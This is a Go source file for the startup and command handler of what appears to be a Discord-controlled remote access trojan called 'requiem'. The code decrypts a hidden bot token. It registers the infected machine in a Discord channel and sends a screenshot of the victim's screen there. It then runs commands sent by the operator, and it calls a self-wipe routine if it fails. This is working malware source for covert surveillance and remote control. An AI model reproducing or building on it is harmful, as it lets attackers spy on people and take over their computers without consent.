package bot

import (
	"fmt"
	"strings"

	"requiem/funcs"
	"requiem/macro"
	"requiem/store"
	"requiem/utils"
	"requiem/utils/discord"

	"github.com/bwmarrin/discordgo"
)

var (
	targetChannel string

	lastCommand   string
	lastArguments []string
)

func Start() {
	store.DecryptedServerID = utils.Decrypt(store.SERVER_ID)

	bot, err := discordgo.New("Bot " + utils.Decrypt(store.BOT_TOKEN))
	if err != nil {
		utils.DebugLog(fmt.Sprintf("failed to create bot - %v", err))
		funcs.Wipe(false)
		return
	}

	bot.AddHandler(handler)

	err = bot.Open()
	if err != nil {
		utils.DebugLog(fmt.Sprintf("failed to open bot - %v", err))
		funcs.Wipe(false)
		return
	}

	macro.LoadMacros()
	store.LoadSettings()
	registerCommands()

	categoryID := utils.Decrypt(store.CATEGORY_ID)
	if categoryID == "" {
		categoryID = discord.FindCategory(bot)
	}

	channelID, new := discord.FindChannel(bot, categoryID)
	targetChannel = channelID

	message := discord.GetConnectionMsg(new)

	ss, err := funcs.TakeScreenshot()
	if err != nil {
		bot.ChannelMessageSend(channelID, message)
		return
	}

	bot.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{
		Content: message,
		Files: []*discordgo.File{{
			Name:   "ss.jpg",
			Reader: ss,
		}},
	})

	utils.DebugLog("started")
	select {}
}

func handler(ses *discordgo.Session, msg *discordgo.MessageCreate) {
	macro.Init(commandsList, ses, msg)

	if msg.Author.ID == ses.State.User.ID {
		return
	}

	if !strings.HasPrefix(msg.Content, store.COMMAND_PREFIX) {
		return
	}

	parts := strings.Fields(msg.Content[len(store.COMMAND_PREFIX):])
	if len(parts) == 0 {
		return
	}

	name := strings.ToLower(parts[0])
	args := parts[1:]

	if name == store.COMMAND_PREFIX && lastCommand != "" {
		go func() {
			defer func() {
				if err := recover(); err != nil {
					ses.ChannelMessageSendReply(
						msg.ChannelID,
						fmt.Sprintf("⚠️ FATAL ERROR: %v", err),
						msg.Reference(),
					)
				}
			}()

			commandsList[lastCommand].Exec(ses, msg, lastArguments)
		}()

		return
	}

	if name == "list" {
		link := fmt.Sprintf(
			"https://discord.com/channels/%s/%s",
			store.DecryptedServerID,
			targetChannel,
		)

		ses.ChannelMessageSendReply(msg.ChannelID, link, msg.Reference())
		return
	}

	if msg.ChannelID != targetChannel {
		return
	}

	if name == "help" {
		var help strings.Builder

		help.WriteString("**Commands:**\n```\n")

		for _, command := range commandsList {
			help.WriteString(command.Name())
			help.WriteString(" - ")
			help.WriteString(command.Info())
			help.WriteString("\n")
		}

		fmt.Fprintf(&help, "```\nPrefix: `%s`", store.COMMAND_PREFIX)

		ses.ChannelMessageSendReply(msg.ChannelID, help.String(), msg.Reference())
		return
	}

	command, exists := commandsList[name]
	if !exists {
		ses.ChannelMessageSendReply(
			msg.ChannelID,
			"This command does not exist.",
			msg.Reference(),
		)

		return
	}

	lastCommand = name
	lastArguments = args

	go func() {
		defer func() {
			if err := recover(); err != nil {
				ses.ChannelMessageSendReply(
					msg.ChannelID,
					fmt.Sprintf("⚠️ FATAL ERROR: %v", err),
					msg.Reference(),
				)
			}
		}()

		command.Exec(ses, msg, args)
	}()
}
